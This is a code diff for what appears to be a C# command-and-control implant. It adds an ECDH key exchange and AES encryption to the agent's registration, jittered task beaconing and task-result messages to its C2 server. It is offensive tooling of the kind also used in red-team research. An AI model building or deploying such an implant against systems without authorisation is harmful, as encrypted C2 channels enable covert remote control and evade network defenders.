@@ -14,6 +14,11 @@ using Agent.Core.Utils.Encoding;
 using System.Runtime.Loader;
 using System.Xml.Linq;
 using System.Threading.Tasks;
+using Agent.Core.Utils;
+using System.Security.Cryptography;
+using Agent.Core.Utils.Encryption;
+using System.Text.Json.Serialization;
+using System.Text;
 
 // #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
@@ -22,6 +27,8 @@ AgentInformationService agentInformationService = new AgentInformationService();
 var baseTransformer = new BaseTransformer();
 var urlSafeBase64EncodingDecorator = new UrlSafeBase64EncodingDecorator(baseTransformer);
 var urlSafeBase64DecodingDecorator = new UrlSafeBase64DecodingDecorator(baseTransformer);
+var aesEncryptionDecorator = new AesEncryptionDecorator(baseTransformer);
+var aesDecryptionDecorator = new AesDecryptionDecorator(baseTransformer);
 
 // Queues, random and agentInfo 
 var taskQueue = new ConcurrentQueue<AgentTask>();
@@ -39,6 +46,32 @@ if (agentInfo is not null)
 {
     baseConfig.AgentId = agentInfo.AgentId ?? string.Empty;
 }
+
+var baseCommunicationService = new CommunicationService(baseConfig);
+
+var (privKey, pubKey) = ECDHUtils.GenerateECDHKeyPair();
+
+var authRequest = new C2Request
+{
+    Message = Convert.ToBase64String(pubKey)
+};
+
+baseCommunicationService.SetHeader("Auth-Token", Convert.ToBase64String(Encoding.UTF8.GetBytes(baseConfig.Token)));
+
+var authResponse = baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(authRequest));
+baseCommunicationService.ClearHeaders(); // Clear the auth token header
+
+// TEMP
+Console.WriteLine(authResponse.Result);
+//
+
+
+var decodedAuthResponse = JsonSerializer.Deserialize<AuthenticationResponse>(authResponse.Result);
+
+var peerPublicKey = Convert.FromBase64String(decodedAuthResponse.PublicKey);
+byte[] sharedSecret = ECDHUtils.DeriveECDHSharedSecret(privKey, peerPublicKey);
+
+baseCommunicationService.SetHeader("Session-Token", Convert.ToBase64String(Encoding.UTF8.GetBytes(decodedAuthResponse.SessionToken)));
 
 // TEMP
 string jsonOutput = JsonSerializer.Serialize(baseConfig);
@@ -60,9 +93,10 @@ var registerRequest = new C2Request
     Message = JsonSerializer.Serialize(agentInfo)
 };
 
+var encryptedRegisterRequestMessage = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(registerRequest), Convert.ToBase64String(sharedSecret));
+
 // Init contact request
-var baseCommunicationService = new CommunicationService(baseConfig);
-var registrationResult = await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(registerRequest));
+var registrationResult = await baseCommunicationService.SimplePostAsync("/", encryptedRegisterRequestMessage);
 
 if (registrationResult is null)
 {
@@ -86,17 +120,27 @@ while (true)
             if (rnd.Next(2) == 0) { realJitter = -realJitter; }
             Thread.Sleep((delay + realJitter) * 1000);
 
-            var taskRequest = new C2Request { Reason = C2RequestReason.Task, AgentId = baseCommunicationService.BaseConfig.AgentId, AgentStatus = AgentStatus.Active };
-            var result = await baseCommunicationService.SimplePostAsync($"/", JsonSerializer.Serialize(taskRequest));
+            var taskRequest = new C2Request 
+            { 
+                Reason = C2RequestReason.Task, 
+                AgentId = baseCommunicationService.BaseConfig.AgentId, 
+                AgentStatus = AgentStatus.Active 
+            };
+
+            var encryptedTaskRequest = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(taskRequest), Convert.ToBase64String(sharedSecret));
+            var result = await baseCommunicationService.SimplePostAsync($"/", encryptedTaskRequest);
 
             if (!string.IsNullOrWhiteSpace(result))
             {
-                var taskResponse = JsonSerializer.Deserialize<C2Request>(result);
+                var decodedResult = JsonSerializer.Deserialize<EncryptedRequest>(result);
+                var decryptedTaskResponse = aesDecryptionDecorator.Transform(decodedResult.Message, Convert.ToBase64String(sharedSecret));
+
+                var taskResponse = JsonSerializer.Deserialize<C2Request>(decryptedTaskResponse);
                 if (taskResponse is null) continue;
+
                 //var decryptedResult = xorDecryptionBase64DecodingDecorator.Transform(taskResponse.Message);
                 var tasks = JsonSerializer.Deserialize<List<AgentTask>>(taskResponse.Message);
                 if (tasks is null || tasks.Count == 0) continue;
-
 
                 foreach (var task in tasks)
                 {
@@ -194,7 +238,9 @@ while (true)
                         Message = JsonSerializer.Serialize(agentTask)
                     };
 
-                    await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(taskUpdateRequest));
+                    var encryptedTaskUpdateRequest = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(taskUpdateRequest), Convert.ToBase64String(sharedSecret));
+                    
+                    await baseCommunicationService.SimplePostAsync("/", encryptedTaskUpdateRequest);
                 }
             }
             else
